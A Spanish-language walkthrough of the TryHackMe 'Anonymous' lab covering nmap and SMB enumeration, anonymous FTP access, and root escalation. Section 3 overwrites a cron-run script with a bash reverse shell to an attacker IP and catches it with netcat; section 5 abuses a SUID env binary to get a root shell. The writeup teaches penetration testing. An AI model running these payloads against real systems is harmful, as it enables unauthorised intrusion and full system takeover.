# Writeup - Anonymous (TryHackMe)

**Máquina:** Anonymous  
**Plataforma:** TryHackMe  
**Sistema:** Linux  
**IP:** 10.130.182.222  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento

### Escaneo de puertos

Comprobamos conectividad y detectamos el sistema operativo por el TTL:

```bash
ping -c 1 10.130.182.222
```

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.130.182.222 -oG all_ports.txt
```

**Resultado:**
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  netbios-ssn
```

```bash
nmap -p21,22,139,445 -sCV -vvv 10.130.182.222 -oN tcp_scan.txt
```

**Resultado:**
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

**Puertos abiertos:** 4

### Enumeración SMB

```bash
smbclient -L //10.130.182.222 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

Share disponible: **pics**

```bash
smbclient //10.130.182.222/pics -N -c "ls"
```

```
corgo2.jpg
puppos.jpeg
```

---

## 2. FTP - Acceso anónimo

El escaneo de nmap indicó `Anonymous FTP login allowed`. Accedemos:

```bash
ftp 10.130.182.222
Name: anonymous
Password: (enter)
ftp> cd scripts
ftp> ls
```

```
clean.sh
removed_files.log
to_do.txt
```

Descargamos los archivos para inspeccionarlos:

```bash
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

**clean.sh:**
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

**to_do.txt:**
```
I really need to disable the anonymous login...it's really not safe
```

El archivo `removed_files.log` contiene decenas de líneas repetidas indicando que `clean.sh` se ejecuta periódicamente vía cron.

El script tiene permisos `rwxr-xrwx` — cualquier usuario puede modificarlo.

---

## 3. Explotación - Reverse shell vía cron

Eliminamos el `clean.sh` original y creamos uno nuevo con únicamente el payload de reverse shell:

```bash
ftp> delete clean.sh
```

```bash
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/192.168.129.82/4444 0>&1' >> clean.sh
```

Lo subimos por FTP:

```bash
ftp> put clean.sh
```

Iniciamos listener en nuestra máquina:

```bash
nc -lvnp 4444
```

En aproximadamente 1 minuto, el cron ejecuta el script modificado y recibimos una conexión reversa:

```
listening on [any] 4444 ...
connect to [192.168.129.82] from (UNKNOWN) [10.130.182.222] 39770
bash: cannot set terminal process group (1314): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

---

## 4. User flag

```bash
namelessone@anonymous:~$ cat /home/namelessone/user.txt
```

```
<REDACTED>
```

---

## 5. Escalada de privilegios

### Enumeración SUID

Buscamos binarios con el bit SUID activado:

```bash
namelessone@anonymous:~$ find / -perm -4000 -type f 2>/dev/null
```

**Resultado relevante:**
```
/usr/bin/env
```

`/usr/bin/env` no debería tener SUID en condiciones normales. Consultamos GTFObins para la técnica de escalada:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
```

```bash
# whoami
root
```

### Root flag

```bash
cat /root/root.txt
```

```
<REDACTED>
```

---

## Resumen de flags

| Flag | Hash | Ubicación |
|------|------|-----------|
| **user.txt** | `<REDACTED>` | `/home/namelessone/` |
| **root.txt** | `<REDACTED>` | `/root/` |

---

## Timeline

1. Reconocimiento con nmap → 4 puertos abiertos: FTP, SSH, SMB
2. FTP permite login anónimo → directorio `/scripts/` con `clean.sh`
3. `clean.sh` es ejecutado por cron y tiene permisos de escritura
4. Subimos reverse shell por FTP → cron la ejecuta → shell como `namelessone`
5. Enumeración → `/usr/bin/env` tiene SUID bit
6. Escalada con GTFObins → `env /bin/sh -p` → shell como root
7. Captura de ambas flags

---

## Lecciones aprendidas

- El login anónimo en FTP con permisos de escritura permite a cualquiera modificar archivos del servidor
- Scripts ejecutados por cron con permisos `world-writable` son vectores de entrada directos
- El bit SUID en binarios inusuales (`/usr/bin/env`) permite escalar privilegios fácilmente
- GTFObins es una referencia esencial para identificar cómo explotar binarios con SUID
- El administrador dejó una nota (`to_do.txt`) reconociendo el problema pero nunca lo solucionó
